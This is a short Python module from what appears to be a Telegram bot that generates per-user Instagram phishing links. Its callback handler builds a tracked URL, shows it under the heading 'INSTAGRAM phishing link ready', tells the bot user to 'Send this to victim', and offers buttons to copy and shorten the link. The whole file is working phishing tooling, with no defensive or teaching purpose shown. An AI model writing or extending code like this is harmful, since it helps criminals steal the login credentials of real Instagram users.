from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import uuid
import time
from config import BASE_URL

# In-memory store for link cache
link_cache = {}

def generate_link(user_id):
    unique_id = str(uuid.uuid4())[:8]
    link = f"{BASE_URL}/p/{unique_id}?type=ig&v={user_id}"
    link_cache[unique_id] = {"user_id": user_id, "time": time.time()}
    return link

def handle_insta_callback(bot, call):
    user_id = call.message.chat.id
    link = generate_link(user_id)
    
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🔗 Open Link", url=link),
        InlineKeyboardButton("📋 Copy Link", callback_data="copy"),
        InlineKeyboardButton("🔗 Shorten URL", url="https://short-link.me/"),
        InlineKeyboardButton("⬅ Back", callback_data="back")
    )
    
    bot.edit_message_text(
        f"✅ *INSTAGRAM phishing link ready:*\n\n`{link}`\n\nSend this to victim.",
        chat_id=user_id,
        message_id=call.message.message_id,
        reply_markup=markup,
        parse_mode="Markdown"
    )
